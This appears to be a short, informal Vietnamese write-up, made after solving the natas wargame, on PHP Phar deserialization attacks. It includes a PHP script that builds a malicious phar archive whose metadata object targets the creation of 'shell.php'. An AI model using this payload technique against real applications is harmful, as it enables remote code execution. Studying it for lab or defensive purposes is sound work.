# Phar Deserialization Attacks
- này là sau khi clear natas :))))
- Sau natas thì t thấy cái này là nổ não nhất nên làm một cái post nhỏ nhỏ để preview
## Phar?
Nôm na thì **Phar (PHP Archive)** nó là 1 định dạng tệp kiểu .zip,.. . Dùng để
1. Lưu trữ dữ liệu (*metadata*) .. //thì nó là định dạng tệp mà :)
2. Execute trực tiếp PHP nếu có *Stub* hợp lệ
- Yo nó là Excute PHP trực tiếp đó, theo tôi tìm hiểu thì nó sẽ thực thi các *magic method* (cái này nói sau)
## Hướng khai thác
- Vấn đề nó sẽ nằm ở việc khi một Phar phar://hehe.phar được thực thi, *Serialized* metadata sẽ *unserialized* :open_mouth:. Điều này có nghĩa ta có thể chèn metadata nguyên mẫu và thực thi các magic method (mặc dù đéo biết tại sao nó bị unserialized :))).
- Ví dụ nhé:
'<?php

class Executor{
    private $filename = "shell.php";
    private $signature = True;
    private $init = false;
}

$phar = new Phar('natas.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

$object = new Executor();
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();

?>
'

